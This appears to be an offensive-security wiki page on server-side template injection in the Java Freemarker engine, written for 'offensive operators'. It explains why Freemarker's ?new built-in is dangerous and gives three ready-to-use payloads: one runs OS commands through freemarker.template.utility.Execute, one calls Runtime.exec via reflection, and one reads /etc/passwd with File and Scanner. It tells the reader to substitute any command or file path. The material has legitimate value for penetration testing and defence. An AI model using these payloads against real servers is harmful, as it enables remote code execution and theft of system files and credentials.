---
title: 'Freemarker Exploitation: SSTI Vulnerabilities in Java'
description: Explore Freemarker SSTI for command execution and data access.
keywords:
- Freemarker exploitation
- SSTI vulnerabilities
- Java template injection
- remote code execution
- sensitive file access
---

# Freemarker Exploitation

## Context

Freemarker exploitation focuses on leveraging Server-Side Template Injection (SSTI) vulnerabilities within Java applications using the Freemarker template engine. This technique enables offensive operators to execute arbitrary commands and access sensitive files within potentially vulnerable Java web applications. An understanding of general template engine operation, Java class structuring, and remote code execution fundamentals are assumed, along with a basic knowledge of identifying and working with SSTI vulnerabilities.

## Theory

### Freemarker Template Engine Internals

Freemarker is a Java-based template engine prominently used for rendering dynamic web content. Its primary functionality is to process templates containing both presentation logic and placeholders for dynamic content.

A core principle of Freemarker is its ability to access Java objects and invoke methods. This flexibility poses security risks if not properly isolated, allowing untrusted template inputs to instantiate and manipulate Java objects, which can lead to arbitrary code execution.

### Freemarker Injection Attack Surface

The Freemarker injection attack surface primarily involves injecting Freemarker expressions into the template context. This action triggers the execution of potentially malicious code. Developers often assume their template operations are safely sandboxed and isolated from sensitive Java classes, leading to exploitable vulnerabilities.

### Java Object Construction and Dangerous Classes

Freemarker facilitates the instantiation of Java classes using the built-in `?new` function, a feature attackers can misuse. Specifically, exposing `freemarker.template.utility.Execute` allows direct OS command execution. Similarly, utilizing `java.io.File` or `java.lang.Runtime` offers file read capabilities and command execution possibilities, respectively.

### Common Exploitation Primitives

Freemarker's `?new` function is exploited to initialize dangerous classes like `Execute` or `Runtime`. Following the initialization, attackers can invoke functions like `exec()` with parameters they control. Additionally, it's possible to leverage classes such as `java.io.File` and `java.util.Scanner` to read sensitive system files or any files accessible to the application.

## Practice

### Remote Command Execution via freemarker.template.utility.Execute

Execute arbitrary system commands on the server through the `freemarker.template.utility.Execute` class.

```freemarker
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id") }
```

This payload assigns the `Execute` class to a variable `ex` and runs the `id` command on the server. Replace `id` with any desired OS command.

### Command Execution via java.lang.Runtime

Use Java reflection to execute system commands via the `java.lang.Runtime` class.

```plaintext
${"".getClass().forName("java.lang.Runtime").getRuntime().exec("id")}
```

This payload independently finds the `Runtime` class and invokes the `exec()` function. Replace `id` with any command to execute.

### Sensitive File Read via java.io.File and java.util.Scanner

Access sensitive files using Freemarker to exploit Java's file operation classes.

```plaintext
<#assign file = "java.io.File"?new("/etc/passwd")>
<#assign scanner = "java.util.Scanner"?new(file)>
${scanner.useDelimiter("\\Z").next()}
```

This process allows reading the content of `/etc/passwd`, showcasing sensitive file access. Substitute `/etc/passwd` with any accessible file path to read its contents.

## Tools

- **Burp Suite**
- **curl**